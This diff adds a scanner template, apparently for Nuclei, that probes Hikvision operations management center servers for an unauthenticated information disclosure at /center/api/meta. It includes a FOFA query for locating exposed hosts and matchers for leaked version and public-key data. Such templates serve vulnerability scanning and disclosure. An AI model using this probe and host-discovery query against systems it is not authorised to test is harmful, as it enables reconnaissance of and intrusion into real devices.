@@ -1,0 +1,27 @@
+id: hikvision-run-manager-api-meta-disclosure
+info:
+  name: 海康威视运行管理中心 /center/api/meta - disclosure
+  author: leadlife
+  severity: high
+  description: 海康威视运行管理中心 /center/api/meta 信息泄露漏洞，该漏洞指敏感信息或资源被未授权地披露给攻击者，根据泄露的内容和上下文，可能会引起多种不同类别的安全问题。
+  reference: 
+    - changting
+  metadata:
+    verified: true
+    fofa-query: body="<h1>Welcome to OpenResty!</h1>" && icon_hash="-808437027"
+  tags: hikvision,disclosure,iot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/center/api/meta"
+      - "{{BaseURL}}/hk/center/api/meta"
+      - "{{BaseURL}}/hikvision/center/api/meta"
+    
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'meta','version','publicKey','hasQRCode')
+        condition: and
